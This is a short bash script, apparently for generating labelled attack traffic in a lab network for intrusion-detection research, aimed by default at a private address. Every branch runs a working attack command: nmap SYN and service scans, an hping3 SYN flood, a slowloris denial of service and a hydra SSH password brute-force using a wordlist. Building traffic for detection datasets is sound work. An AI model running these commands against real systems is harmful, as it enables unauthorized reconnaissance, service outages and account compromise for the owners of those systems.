#!/usr/bin/env bash
# Attack traffic generator: 
# Use: attack.sh {portscan|dos|bruteforce} [victim_ip]

set -u

FAMILY="${1:?usage: attacks.sh portscan|portscan_svc|dos_syn|dos_slow|bruteforce [victim] [duration]}"
VICTIM="${2:-172.30.0.10}"
DURATION="${3:-45}"

case "$FAMILY" in
  portscan)
    # fast SYN scan across 1-1024 -> many SYN-only micro-flows
    echo "[attack] portscan (SYN, 1-1024) -> $VICTIM"
    nmap -sS -T4 -p 1-1024 "$VICTIM"
    ;;
  portscan_svc)
    # service/version detection -> completes handshakes, richer multi-packet flows
    echo "[attack] portscan (service/version) -> $VICTIM"
    nmap -sV -T4 -p 21,22,80,443,3306,8080 "$VICTIM"
    ;;
  dos_syn)
    # bounded SYN flood: small on purpose (these husk-collapse under dedup)
    echo "[attack] dos (bounded SYN flood) -> ${VICTIM}:80"
    hping3 -S -p 80 -i u500 -c 2500 "$VICTIM"
    ;;
  dos_slow)
    # slowloris: many long-lived half-open connections -> real multi-packet flows
    echo "[attack] dos (slowloris, ${DURATION}s) -> ${VICTIM}:80"
    timeout "${DURATION}s" slowloris "$VICTIM" -p 80 -s 200 --sleeptime 15 || true
    ;;
  bruteforce)
    # SSH brute-force; no -f so it works the whole wordlist (many connection flows)
    echo "[attack] ssh brute-force -> $VICTIM"
    hydra -l victimuser -P /scripts/passwords.txt -t 4 -I "ssh://${VICTIM}"
    ;;
  *)
    echo "unknown family: $FAMILY" >&2; exit 2 ;;
esac
echo "[attack] $FAMILY done"